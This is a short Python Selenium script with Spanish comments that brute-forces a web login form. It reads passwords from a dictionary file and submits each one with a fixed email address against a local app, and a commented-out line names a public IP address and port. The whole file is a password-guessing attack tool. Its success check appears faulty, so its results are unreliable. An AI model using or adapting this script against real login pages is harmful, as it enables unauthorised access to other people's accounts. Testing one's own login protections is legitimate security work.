from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
import time




# Configuración del navegador
driver = webdriver.Chrome()  # Asegúrate de tener el controlador del navegador instalado
#url = "http://49.13.155.184:8081"
url="http://localhost:4200"
driver.get(url)

# Localiza los campos de entrada y el botón en la página
email_input = driver.find_element("id", "email")
password_input = driver.find_element("id", "password")
login_button = driver.find_element(By.XPATH, "//*[@id='bto_login']/button")
#wait = WebDriverWait(driver, 10)
#login_button = wait.until(EC.element_to_be_clickable((By.ID, "bto_login")))


#login_button = driver.find_element(By.ID, "bto_login")


# Ruta al archivo de contraseñas
archivo_password = ".\\password\\diccionario.txt"

# Lista para almacenar las contraseñas
list_password = []

# Leer contraseñas desde el archivo
with open(archivo_password, "r") as file:
    list_password = [line.strip() for line in file]

# Variable para indicar si se inició sesión
inicio_sesion_exitoso = False


# Ciclo para probar cada contraseña
for password in list_password:



    email_input.clear()  # Limpiar el campo de correo electrónico
    password_input.clear()  # Limpiar el campo de contraseña

    email_input.send_keys("alex@email.com")
    password_input.send_keys(password)
    print(f"probando con esta : {password}")
    delay=3
    
 # Envía el formulario haciendo clic en el botón de inicio de sesión
    try:
       

        actions = ActionChains(driver)
        actions.click(login_button).pause(1).perform()
        
        print("Botón de inicio de sesión clicado.") 
        
        wait = WebDriverWait(driver, timeout=2)
        wait.until(lambda d : login_button.is_displayed())
        

        # Puedes verificar si el inicio de sesión fue exitoso observando cambios en la página o verificando mensajes de error, etc.
        # En este ejemplo, asumimos que un cambio en la URL indica un inicio de sesión exitoso.
        if len(password_input.text) != 0:
            inicio_sesion_exitoso = True
            print(f"Inicio de sesión exitoso. Contraseña utilizada: {password}")
            break  # Detener el bucle si se inicia sesión correctamente
    except Exception as e:
        print(f"No se pudo hacer clic en el botón de inicio de sesión: {str(e)}")

        

 
# Si no se inicia sesión correctamente
if not inicio_sesion_exitoso:
    print("No se pudo iniciar sesión con ninguna contraseña.")

# Cierra el navegador al final

driver.quit()